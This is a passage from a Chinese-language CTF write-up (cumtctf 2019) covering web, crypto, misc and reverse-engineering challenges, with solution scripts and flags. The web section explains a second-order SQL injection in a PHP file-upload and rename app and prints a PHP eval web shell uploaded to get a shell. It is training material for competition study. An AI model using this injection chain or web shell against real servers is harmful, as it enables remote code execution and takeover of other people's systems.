class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <a href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a>，而且还给出了攻击流程，本题是个二次注入。</p><p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p><ol><li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p></li><li><p>利用update更新是的后缀名为空，<em>old name:</em>  <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>;<em>new name:</em> <code>snow.jpg</code>，此时执行的sql命令变成<br><code>update <code>file</code> set <code>filename</code>=’snow.jpg’,<code>oldname</code>=’’,extension=’’,filename=’snow.jpg.jpg’ where <code>fid</code>={$result[‘fid’]};</code> ，这样的话数据库中就有文件名为 <code>snow.jpg</code>，后缀名为空的记录，但是实际的文件名却是<code>snow.jpg.jpg</code></p></li><li><p>上传真正包含shell的文件<code>&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt;</code> ，命名为<code>snow.jpg</code>，数据库中的记录是文件名为snow，扩展名为jpg，</p></li><li><p>使用rename重命名 <em>old name:</em> <code>snow.jpg</code>，<em>new name:</em> <code>snow.php</code>，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为<code>snow.php</code>，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。</p></li></ol><p><img src="https://i.loli.net/2019/01/27/5c4d642c02f24.png" alt></p><p><img src="https://i.loli.net/2019/01/27/5c4d642bedc54.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt></p><h2 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h2><p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"xxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## easyrsa</span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">e &#x3D; 5</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)</span><br><span class="line">c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)</span><br><span class="line">m, b &#x3D; gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure></p><p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></figure></p><h2 id="playfir"><a href="#playfir" class="headerlink" title="playfir"></a>playfir</h2><p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">li = pass_table.index(word)</span><br><span class="line">li_r = li // <span class="number">5</span></span><br><span class="line">li_c = li % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line"><span class="keyword">if</span> r1 == r2:</span><br><span class="line">c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">elif</span> c1 == c2:</span><br><span class="line">r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line"><span class="comment"># global pass_table</span></span><br><span class="line">alpha = list(string.ascii_uppercase)</span><br><span class="line">alpha.remove(<span class="string">'J'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">alpha.remove(i)</span><br><span class="line">pass_table = list(keyword) + alpha</span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">plain += pass_table[p1] + pass_table[p2]</span><br><span class="line"><span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">t1 = decrypt(cip1,now_key)</span><br><span class="line">t2 = decrypt(cip2,now_key)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">print(t1)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">print(t2)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p><blockquote><p>flagaplayfirflagbyoudoit</p></blockquote><p>求出md5值即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>解压之后给出了5个图片文件:</p><p><img src="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png" alt></p><p>文件夹名是braille，想到了盲文，搜索盲文对照表</p><p><img src="https://i.loli.net/2019/01/29/5c4fc69264c59.png" alt></p><p>根据解压文件夹的提示可以对照出flag是B1ind。</p><h2 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下??"></a>base全家桶了解一下??</h2><p>应该就是base编码的转换，尝试一下不同的base编码即可</p><p>第一层base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></figure><p>第二层base32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></figure><p>第三层base16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></figure><h2 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h2><p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p><blockquote><p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p></blockquote><p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p><p><img src="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></figure><h2 id="矿大校歌认真听听吧？"><a href="#矿大校歌认真听听吧？" class="headerlink" title="矿大校歌认真听听吧？"></a>矿大校歌认真听听吧？</h2><p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<a href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a>，运行尝试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></figure><h2 id="起床改error啦！"><a href="#起床改error啦！" class="headerlink" title="起床改error啦！"></a>起床改error啦！</h2><p>binwalk查看图片发现存在zip压缩包，提取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2333.png</span><br><span class="line">foremost 2333.png</span><br></pre></td></tr></table></figure><p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p><p><img src="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png" alt></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="逆向签到"><a href="#逆向签到" class="headerlink" title="逆向签到"></a>逆向签到</h2><p>直接丢进IDA查看，查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png" alt></p><p>可以看到这些变量占用了4个字节来存储。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ade58965.png" alt></p><p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1c7412770.png" alt></p><p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a3be6535.png" alt></p><h2 id="Eazy-Math"><a href="#Eazy-Math" class="headerlink" title="Eazy_Math"></a>Eazy_Math</h2><p>同样的，还是丢进IDA中查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png" alt></p><p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p><p>首先查看String2Int函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1be73b91e.png" alt="img"></p><p>这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。</p><p>查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。</p><p>最后是Change函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ab4dec43.png" alt></p><p>第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：</p><script type="math/tex; mode=display">\begin{cases}A+2B+C=274\\2A+B+C=294\\A+B+2C=316\end{cases}</script><script type="math/tex; mode=display">\begin{cases}D+2E+F=262 \\2D+E+F=274 \\D+E+2F=252 \\\end{cases}</script><script type="math/tex; mode=display">\begin{cases}G+2H+I=380 \\2G+H+I=421 \\G+H+2I=427 \\\end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
</feed>
